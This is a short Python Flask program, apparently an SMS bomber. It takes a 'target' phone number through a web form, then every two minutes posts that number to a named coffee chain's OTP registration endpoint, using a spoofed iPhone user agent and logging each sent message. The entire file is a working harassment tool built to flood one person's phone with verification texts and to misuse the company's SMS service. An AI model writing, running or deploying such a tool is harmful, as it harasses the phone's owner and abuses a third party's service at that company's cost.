import os, requests, time, threading
from flask import Flask, render_template_string, request, redirect, url_for

app = Flask(__name__)

target_phone = ""
logs = []
sms_count = 0

def send_kahve_dunyasi_otp():
    global target_phone, logs, sms_count
    if not target_phone: return
    
    url = "https://www.kahvedunyasi.com/api/v1/auth/register-otp"
    payload = {"mobile_number": target_phone, "country_code": "90"}
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15"
    }
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=15)
        sms_count += 1
        tm = time.strftime('%H:%M:%S')
        status = f"[{sms_count}] Gonderildi -> HTTP {response.status_code}"
        logs.insert(0, f"[{tm}] {status}")
    except:
        logs.insert(0, f"[{time.strftime('%H:%M:%S')}] Hata Oluştu")
    if len(logs) > 50: logs.pop()

# ARKA PLAN ÇALIŞTIRICI (Scheduler yerine en basiti)
def background_worker():
    while True:
        if target_phone:
            send_kahve_dunyasi_otp()
        time.sleep(120)

threading.Thread(target=background_worker, daemon=True).start()

@app.route('/', methods=['GET', 'POST'])
def index():
    global target_phone
    if request.method == 'POST':
        target_phone = request.form.get('phone', '').strip()
        return redirect(url_for('index'))
    
    return render_template_string("""
        <h1>SMS MOTORU - Hedef: {{ p }}</h1>
        <form method="POST"><input name="phone"><button>BAŞLAT</button></form>
        <ul>{% for l in lgs %}<li>{{ l }}</li>{% endfor %}</ul>
    """, p=target_phone, lgs=logs)

# if __name__ main kısmına Gunicorn yazma! Render zaten dışarıdan çağıracak.
